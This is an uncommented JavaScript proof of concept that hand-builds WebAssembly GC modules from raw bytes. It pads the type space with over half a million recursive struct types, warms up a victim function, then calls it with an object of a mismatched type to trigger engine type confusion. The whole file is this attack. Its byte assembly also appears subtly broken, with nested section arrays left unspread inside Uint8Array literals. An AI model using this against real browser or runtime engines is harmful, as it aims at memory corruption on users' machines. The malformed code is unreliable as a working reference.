function hot_func(victim, arg) {
    try {
        victim(arg);
    } catch (e) {}
}

const leb128 = n => {
    const r = [];
    do {
        let byte = n & 0x7f;
        n >>>= 7;
        if (n !== 0) byte |= 0x80;
        r.push(byte);
    } while (n !== 0);
    return r;
};

const section = (id, payload) => [id, ...leb128(payload.length), ...payload];

const kRecGroup = 0x4e;
const kFunc = 0x60;
const kStruct = 0x50;
const kSub = 0x5f;
const kI32 = 0x7f;
const kF64 = 0x7c;
const kRef = 0x63;
const kStructGet = 0x03;
const kStructNew = 0x01;
const kEnd = 0x0b;
const kReturn = 0x0f;
const kLocalGet = 0x20;

const kPadTypes = 524288;

const m1_bytes = (() => {
    const types = [
        kRecGroup, ...leb128(2),
        kSub, 0, kStruct, 0,
        kSub, 0, kSub, 1, ...leb128(0), kStruct, 0,
    ];
    const funcs = [1];
    const exports = [
        ...leb128(1), ...leb128(8), ...("make_sub".split('').map(c => c.charCodeAt(0))), 0, 0
    ];
    const code = section(10, [
        ...leb128(1),
        ...leb128(2), 0, kStructNew, 1, kEnd
    ]);
    return new Uint8Array([
        0, 97, 115, 109, 1, 0, 0, 0,
        section(1, types),
        section(3, [1, ...funcs]),
        section(7, exports),
        code
    ]);
})();

const make_filler_bytes = (id) => {
    let rec_types = [];
    rec_types.push(kSub, 0, kStruct, 0);
    for (let i = 1; i < kPadTypes; i++) {
        rec_types.push(kSub, 0, kStruct, 1, kRef, ...leb128(i - 1), 0);
    }
    const types = [
        ...leb128(2),
        kFunc, ...leb128(id), ...new Array(id).fill(kI32), 0, 0,
        kRecGroup, ...leb128(kPadTypes), ...rec_types
    ];
    return new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, section(1, types)]);
};

const m3_bytes = (() => {
    const types = [
        kRecGroup, ...leb128(1),
        kSub, 0, kStruct, 1, kF64, 0
    ];
    const funcs = [0, 0];
    const exports = [
        ...leb128(2),
        ...leb128(6), ...("victim".split('').map(c => c.charCodeAt(0))), 0, 0,
        ...leb128(11), ...("make_target".split('').map(c => c.charCodeAt(0))), 0, 1
    ];
    const code_payload = [
        ...leb128(2),
        ...leb128(2), 0, kLocalGet, 0, kEnd,
        ...leb128(2), 0, kStructNew, 0, kEnd
    ];
    return new Uint8Array([
        0, 97, 115, 109, 1, 0, 0, 0,
        section(1, types),
        section(3, [2, ...funcs]),
        section(7, exports),
        section(10, code_payload)
    ]);
})();

const m1 = new WebAssembly.Instance(new WebAssembly.Module(m1_bytes));
const confused_obj = m1.exports.make_sub();

const filler1_module = new WebAssembly.Module(make_filler_bytes(0));
const filler2_module = new WebAssembly.Module(make_filler_bytes(1));
new WebAssembly.Instance(filler1_module);
new WebAssembly.Instance(filler2_module);

const m3 = new WebAssembly.Instance(new WebAssembly.Module(m3_bytes));
const victim_func = m3.exports.victim;
const valid_obj = m3.exports.make_target();

for (let i = 0; i < 100; ++i) {
    hot_func(victim_func, valid_obj);
}

hot_func(victim_func, confused_obj);